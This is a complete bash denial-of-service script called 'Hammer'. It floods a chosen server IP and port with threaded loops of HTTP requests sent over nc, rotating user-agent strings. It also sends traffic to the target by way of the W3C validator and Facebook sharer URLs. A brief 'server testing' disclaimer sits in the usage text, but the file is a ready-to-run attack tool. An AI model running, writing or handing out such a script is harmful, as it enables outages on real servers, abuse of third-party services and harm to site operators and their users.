#!/bin/bash

# Colors
RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
BLUE='\033[94m'
NC='\033[0m' # No Color

# Global variables
HOST=""
PORT=80
THREADS=135
USER_AGENTS=(
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0"
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7"
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
)

BOTS=(
    "http://validator.w3.org/check?uri="
    "http://www.facebook.com/sharer/sharer.php?u="
)

# Function to display usage information
usage() {
    echo -e "${GREEN}Hammer DoS Script v.1 - Bash Version"
    echo "It is the end user's responsibility to obey all applicable laws."
    echo "It is just for server testing script. Your ip is visible."
    echo ""
    echo "Usage: $0 [-s SERVER] [-p PORT] [-t THREADS]"
    echo "  -s SERVER   Server IP to attack (required)"
    echo "  -p PORT     Port number (default: 80)"
    echo "  -t THREADS  Number of threads (default: 135)"
    echo "  -h          Show this help message${NC}"
    exit 1
}

# Function to get random user agent
random_user_agent() {
    local num_agents=${#USER_AGENTS[@]}
    local random_index=$((RANDOM % num_agents))
    echo "${USER_AGENTS[$random_index]}"
}

# Function to hammer with bots
bot_hammering() {
    local url="$1"
    while true; do
        local ua=$(random_user_agent)
        curl -s -A "$ua" "$url" > /dev/null &
        echo -e "${BLUE}bot is hammering...${NC}"
        sleep 0.1
    done
}

send_packets() {
    local host="$1"
    local port="$2"
    while true; do
        local ua=$(random_user_agent)
        echo -en "GET / HTTP/1.1\r\nHost: $host\r\nUser-Agent: $ua\r\n\r\n" | timeout 2 nc "$host" "$port" > /dev/null 2>&1 &
        echo -e "${GREEN}$(date)${NC}${BLUE} <-- packet sent! hammering -->${NC}"
        sleep 0.1
    done
}

# Main function
main() {
    # Parse command line options
    while getopts ":s:p:t:h" opt; do
        case $opt in
            s) HOST="$OPTARG" ;;
            p) PORT="$OPTARG" ;;
            t) THREADS="$OPTARG" ;;
            h) usage ;;
            \?) echo -e "${RED}Invalid option: -$OPTARG${NC}" >&2; usage ;;
            :) echo -e "${RED}Option -$OPTARG requires an argument.${NC}" >&2; usage ;;
        esac
    done

    # Check if host is provided
    if [ -z "$HOST" ]; then
        echo -e "${RED}Error: Server IP is required${NC}"
        usage
    fi

    # Display attack information
    echo -e "${GREEN}Target: $HOST Port: $PORT Threads: $THREADS${NC}"
    echo -e "${BLUE}Please wait...${NC}"

    # Verify server connection
    if ! nc -z -w 1 "$HOST" "$PORT"; then
        echo -e "${RED}Error: Could not connect to $HOST:$PORT${NC}"
        exit 1
    fi

    sleep 5

    # Start attack threads
    for ((i=1; i<=THREADS; i++)); do
        # Start packet sending threads
        send_packets "$HOST" "$PORT" &
       
        # Start bot hammering threads (using random bots)
        local random_bot="${BOTS[$((RANDOM % ${#BOTS[@]}))]}"
        bot_hammering "${random_bot}http://${HOST}" &
    done

    # Keep the script running
    wait
}

# Start the main function
main "$@"
